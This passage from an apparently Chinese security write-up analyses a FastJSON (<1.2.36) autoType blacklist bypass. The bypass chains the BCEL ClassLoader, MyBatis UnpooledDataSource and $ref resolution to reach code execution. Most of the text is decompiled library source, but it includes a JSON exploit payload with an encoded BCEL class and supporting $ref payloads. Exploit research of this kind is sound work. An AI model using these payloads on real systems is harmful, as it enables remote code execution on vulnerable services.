class="keyword">if</span> (contextClassLoader != <span class="keyword">null</span> &amp;&amp; contextClassLoader != classLoader) &#123;</span><br><span class="line">                    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">                    mappings.put(className, clazz);</span><br><span class="line">                    <span class="keyword">return</span> clazz;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz = Class.forName(className);</span><br><span class="line">                mappings.put(className, clazz);</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var4) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过[com.sun.org.apache.bcel.internal.util.ClassLoader、Lcom.sun.org.apache.bcel.internal.util.ClassLoader; 都可以绕过startsWith的黑名单。</p>
<p>但是TypeUtils.getClassFromMapping不存在这个特性，直接无任何处理从ConcurrentMap mapping中获取clazz。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> (Class)mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样导致了依然无法利用，因为在TypeUtils.loadClass后还会使用isAssignableFrom判断获取到的clazz是否为ClassLoader子类，如果是则会抛出异常结束流程，当然BCEL ClassLoader肯定是ClassLoader的子类，导致无法利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了逃脱classloader的检测，必须在ClassLoader检测之前就return clazz，只能指望TypeUtils.getClassMapping，不过刚才也提到了getClassMapping方法无任何特性能够帮助我们绕过黑名单。</p>
<p>在两层黑名单检测的逻辑中，第一层是指定了期望类后才会进行黑名单检测，第二层在未开启AutoType状态下一定会检测。</p>
<p>那么只要在反序列BCEL ClassLoader时不指定期望类，就可以不经过第一层黑名单检测，直接通过getClassFromMapping方法获取clazz了，同时通过getClassFromMapping获取到clazz后就会直接返回clazz，不会再经过classloader检测。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2022/11/12/16682376952000.jpg"></p>
<p>在反序列化设置com.sun.org.apache.bcel.internal.util.ClassLoader的driverClassLoader属性时，发现确实指定了期望类为java.lang.Classloader，但是我们也没有手动给driverClassloader设置期望类。</p>
<p>调试发现Fastjson在正常反序列化时，com.alibaba.fastjson.parser.DefaultJSONParser#parseObject处理，传入autotype的期望类确实为null<br>Class&lt;?&gt; clazz = this.config.checkAutoType(ref, (Class)null);</p>
<p>但如果是通过@type反序列化设置bean属性时，则是通过com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze处理，在该方法中会去获取属性对应的类型，并且作为期望类传入到autotype方法中，导致会进入到第一层的黑名单检测中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (deserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">    Class&lt;?&gt; expectClass = TypeUtils.getClass(type);</span><br><span class="line">    userType = config.checkAutoType(ref, expectClass);</span><br><span class="line">    deserializer = parser.getConfig().getDeserializer(userType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是否还有其他的方法不指定exceptclass设置属性值呢，很容易想到FastJSON的$ref特性。<br>既然正常非属性值的反序列化是不会设置exceptclass的，那么先反序列化生成BCEL ClassLoader之后，再通过$ref引用设置到driverClassLoader属性即可绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;&#125;,&#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;,&quot;&quot;:&quot;&quot;&#125;,&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;, &quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$[2]&quot;&#125;, &quot;driver&quot;:&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$h1$Q$7dN$96$ec$H$h$C$a1$J$94$C$N$a5$zI$r$c8$81cP$_$V$95$aan$L$o$u$a8G$c75$c1tY$af6$O$f0$8f8s$a1$V$95$da$7b$7f$Ub$bcEi$q$ea$83g$e6$bd7$cfc$fb$cf$dd$ed$_$A$dbh$G$f0$b1$Y$e0$v$96$3c$3c$b3q$d9$c5$8a$8b$d5$A$r$3cw$d1p$b1$c6P$daQ$892o$Z$8a$cdV$8f$c1y$a7$bfJ$86J$a4$S$f9yt$d6$97$d9$n$ef$c7$84T$p$zx$dc$e3$99$b2$f5$D$e8$98$T5$q$8fh$f7$5c$c5$j$GoG$c4$Pv$8c$e8Zt$ca$cfy$5b$e9$f6$87$bd$ddK$nS$a3tB$b2r$d7p$f1$ed$TOs$h$g$8a$n$e8$eaQ$s$e4$7bem$7dk$b7e$7bC$E$98v$f1$o$c4$3a$5e2$d4u$w$93$c6$so$d0$ub$Us$a3$b3$z$9e$a6$n$5e$e15$c3$fc$7fNcX$ca$d1$98$t$83$f6$c1$u1$eaL$8eI$eb$beA$b7$b0$c71$cc$fe$T$ee$f5O$a50$Ms$8fzi$d2$814$e3$a2$d6lE$8f4tCG$5eJ$c1$b0$d1$9c$60$bb$sS$c9$a03$d9$b0$9fi$n$87CjX$9cT$k$9ed$fa$c2$3eM$a7$d5$c3$g$3c$faG$bb$K$60$f69h$P$f3$P$a6G$a68$f5$e6$3b$d8uN$97i$P$u$822$H$V$ccP$W$fe$VQ5K$d1$c3$dc$d8$e0$Y$c5$9c$5b$f8$81B$b5x$D$e7$e8$K$e5$8f$3fQ$faB$8e$ee$ef$eb$9c$f4I$3aEBk$5d$a7$Mp$J$L$I$f5$I$f3$J$9b$k$lc$eb$w$e6$a9z$92$eb$K$91$8b$9aOD$3d$9fn$e1$k$acK$b2$e2$9a$C$A$A&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p>以上JSON经过FastJSON解析后，未报错并且成功设置上了driverClassLoader属性，那么只需要再调用到getter getConnection方法就可以实现代码执行了。</p>
<p>FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。<br>$ref调用getter方法，根据网上说法需要在&gt;=1.2.36版本才可以实现，所以无法在我们的目标上利用。<br>JSONObject可以在低版本使用，但是也存在一个很尴尬的问题。<br>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject ，在处理$ref时是通过addResolveTask新增了一个任务，在parse完成之后再来处理任务。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == <span class="string">&quot;$ref&quot;</span> &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    .....................</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;..&quot;</span>.equals(ref)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (context.object != <span class="keyword">null</span>) &#123;</span><br><span class="line">            refValue = context.object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.addResolveTask(<span class="keyword">new</span> ResolveTask(context, ref));</span><br><span class="line">            <span class="keyword">this</span>.setResolveStatus(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;$&quot;</span>.equals(ref)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addResolveTask(<span class="keyword">new</span> ResolveTask(context, ref));</span><br><span class="line">        <span class="keyword">this</span>.setResolveStatus(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(rootContext = context; rootContext.parent != <span class="keyword">null</span>; rootContext = rootContext.parent) &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rootContext.object != <span class="keyword">null</span>) &#123;</span><br><span class="line">        refValue = rootContext.object;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.addResolveTask(<span class="keyword">new</span> ResolveTask(rootContext, ref));</span><br><span class="line">        <span class="keyword">this</span>.setResolveStatus(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而JSONObject调用getter的利用，一样在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject中，在parse时就会调用到getter方法，无法等到处理完$ref的任务后再调用getter，导致调用到getConnection方法时还未设置driverClassloader属性值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (object.getClass() == JSONObject.class) &#123;</span><br><span class="line">    key = key == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : key.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为ResolveTask的原因，导致不能使用JSONObject调用getter的方式，那么还是只能指望$ref调getter了。<br>首先研究一下$ref为什么只有在&gt;=1.2.36版本后才能调用getter，以及是否有可能在低版本实调用getter，$ref调用getter的调用栈为</p>
<p>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask<br>com.alibaba.fastjson.JSONPath#eval<br>com.alibaba.fastjson.JSONPath$PropertySegement#eval<br>com.alibaba.fastjson.JSONPath#getPropertyValue</p>
<p>最终在getPropertyValue方法中调用到对应属性的getter方法，在低版本中， 处理$ref任务时要调用到JSONPath.eval 存在多个限制， refValue必须非null、类型为JSONObject且fieldInfo不为null。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleResovleTask</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.resolveTaskList != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> size = <span class="keyword">this</span>.resolveTaskList.size(); i &lt; size; ++i) &#123;</span><br><span class="line">            ResolveTask task = (ResolveTask)<span class="keyword">this</span>.resolveTaskList.get(i);</span><br><span class="line">            String ref = task.referenceValue;</span><br><span class="line">            Object object = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (task.ownerContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                object = task.ownerContext.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object refValue = ref.startsWith(<span class="string">&quot;$&quot;</span>) ? <span class="keyword">this</span>.getObject(ref) : task.context.object;</span><br><span class="line">            FieldDeserializer fieldDeser = task.fieldDeserializer;</span><br><span class="line">            <span class="keyword">if</span> (fieldDeser != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (refValue != <span class="keyword">null</span> &amp;&amp; refValue.getClass() == JSONObject.class &amp;&amp; fieldDeser.fieldInfo != <span class="keyword">null</span> &amp;&amp; !Map.class.isAssignableFrom(fieldDeser.fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    Object root = <span class="keyword">this</span>.contextArray[<span class="number">0</span>].object;</span><br><span class="line">                    refValue = JSONPath.eval(root, ref);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fieldDeser.setValue(object, refValue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在&gt;=1.2.36时，除了原有的JSONPath查询逻辑还新增了一个如果refValue为null也会调用到JSONPath.eval的逻辑，调用到JSONPath.eval基本不存在限制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleResovleTask</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.resolveTaskList != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> size = <span class="keyword">this</span>.resolveTaskList.size(); i &lt; size; ++i) &#123;</span><br><span class="line">            ResolveTask task = (ResolveTask)<span class="keyword">this</span>.resolveTaskList.get(i);</span><br><span class="line">            String ref = task.referenceValue;</span><br><span class="line">            Object object = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (task.ownerContext != <span class="keyword">null</span>) &#123;</span><br><span class="line">                object = task.ownerContext.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Object refValue;</span><br><span class="line">            <span class="keyword">if</span> (ref.startsWith(<span class="string">&quot;$&quot;</span>)) &#123;</span><br><span class="line">                refValue = <span class="keyword">this</span>.getObject(ref);</span><br><span class="line">                <span class="keyword">if</span> (refValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        refValue = JSONPath.eval(value, ref);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (JSONPathException var10) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                refValue = task.context.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            FieldDeserializer fieldDeser = task.fieldDeserializer;</span><br><span class="line">            <span class="keyword">if</span> (fieldDeser != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (refValue != <span class="keyword">null</span> &amp;&amp; refValue.getClass() == JSONObject.class &amp;&amp; fieldDeser.fieldInfo != <span class="keyword">null</span> &amp;&amp; !Map.class.isAssignableFrom(fieldDeser.fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    Object root = <span class="keyword">this</span>.contextArray[<span class="number">0</span>].object;</span><br><span class="line">                    refValue = JSONPath.eval(root, ref);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>了解清楚&lt;1.2.36版本$ref getter的限制之后，尝试绕过</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (refValue != <span class="keyword">null</span> &amp;&amp; refValue.getClass() == JSONObject.class &amp;&amp; fieldDeser.fieldInfo != <span class="keyword">null</span> &amp;&amp; !Map.class.isAssignableFrom(fieldDeser.fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    Object root = <span class="keyword">this</span>.contextArray[<span class="number">0</span>].object;</span><br><span class="line">                    refValue = JSONPath.eval(root, ref);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>因为RCE需要触发的是getConnection方法，所以大概率需要$.connection来触发，为了满足refValue不为null，需要在JSON里加一个connection的key，同时限制了refValue的类型为JSONObject，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">deserialze</span><span class="params">(DefaultJSONParser parser, Type type, Object fieldName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (type == JSONObject.class &amp;&amp; parser.getFieldTypeResolver() == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> parser.parseObject();</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">boolean</span> parentIsArray = fieldName != <span class="keyword">null</span> &amp;&amp; fieldName.getClass() == Integer.class;</span><br><span class="line">JSONObject input = <span class="keyword">new</span> JSONObject(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">ParseContext ctxLocal = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!parentIsArray) &#123;</span><br><span class="line">    ctxLocal = <span class="keyword">this</span>.setContext(context, input, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>FastJSON在反序列JSONObject时，设置的context是ROOT，而且JSONObject设置context时对fieldName无任何限制。如果是反序列其他的类，fieldName必须是存在的属性。<br>那么就可以通过JSONObject对ROOT context设置一个connection属性，同时类型为JSONObject<br>{“@type”:”com.alibaba.fastjson.JSONObject”,”connection”:{}}</p>
<p>在对root context设置了connection后，再通过$ref获取root的connection，因为还限制了fieldInfo不能为null，所以需要在一个存在的field里面调用$ref。</p>
<p>不过能够获取root context的connection了暂时也没用，因为root context不会是UnpooledDataSource对象，无法直接调用到getConnection方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;,&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.connection&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>在完成这一系列对应的构造后，调用到JSONPath.eval然后调用到getPropertyValue后，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getPropertyValue</span><span class="params">(Object currentObject, String propertyName, <span class="keyword">boolean</span> strictMode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (currentObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentObject <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        Map map = (Map)currentObject;</span><br><span class="line">        Object val = map.get(propertyName);</span><br><span class="line">        <span class="keyword">if</span> (val == <span class="keyword">null</span> &amp;&amp; <span class="string">&quot;size&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">            val = map.size();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; currentClass = currentObject.getClass();</span><br><span class="line">        JavaBeanSerializer beanSerializer = <span class="keyword">this</span>.getJavaBeanSerializer(currentClass);</span><br><span class="line">        <span class="keyword">if</span> (beanSerializer != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> beanSerializer.getFieldValue(currentObject, propertyName);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONPathException(<span class="string">&quot;jsonpath error, path &quot;</span> + <span class="keyword">this</span>.path + <span class="string">&quot;, segement &quot;</span> + propertyName, var12);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (currentObject <span class="keyword">instanceof</span> List) &#123;</span><br><span class="line">            List list = (List)currentObject;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;size&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                <span class="keyword">return</span> list.size();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                List&lt;Object&gt; fieldValues = <span class="keyword">new</span> JSONArray(list.size());</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.size(); ++i) &#123;</span><br><span class="line">                    Object obj = list.get(i);</span><br><span class="line">                    Object itemValue = <span class="keyword">this</span>.getPropertyValue(obj, propertyName, strictMode);</span><br><span class="line">                    <span class="keyword">if</span> (itemValue <span class="keyword">instanceof</span> Collection) &#123;</span><br><span class="line">                        Collection collection = (Collection)itemValue;</span><br><span class="line">                        fieldValues.addAll(collection);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        fieldValues.add(itemValue);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> fieldValues;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (currentObject <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">                Enum e = (Enum)currentObject;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.name();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;ordinal&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.ordinal();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (currentObject <span class="keyword">instanceof</span> Calendar) &#123;</span><br><span class="line">                Calendar e = (Calendar)currentObject;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;year&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.get(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;month&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.get(<span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;day&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.get(<span class="number">5</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;hour&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.get(<span class="number">11</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;minute&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.get(<span class="number">12</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;second&quot;</span>.equals(propertyName)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> e.get(<span class="number">13</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONPathException(<span class="string">&quot;jsonpath error, path &quot;</span> + <span class="keyword">this</span>.path + <span class="string">&quot;, segement &quot;</span> + propertyName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果获取不到currentObject的序列化器，且currentObject是List，那么会遍历List中的对象再递归调用getPropertyValue，在遍历递归过程中如果一旦获取不到对应的属性就会抛出异常结束流程。<br>因为list类型会遍历，那么我们利用JSONArray，也就是[{},{}]即可实现遍历。<br>为了解决获取不到属性就抛出异常的问题，需要将org.apache.ibatis.datasource.unpooled.UnpooledDataSource提到List的第一个。<br>不过低版本的利用，需要先将恶意类加入到Mapping中，按理第一个对象会是java.lang.Class而不能是UnpooledDataSource，又为了解决这个问题，只能将利用分段。<br>首先第一次请求使用java.lang.Class将所有利用类加入到mapping中，第二次请求将UnpooledDataSource放到list的第一位，再调用getter实现RCE，最终的利用代码。</p>
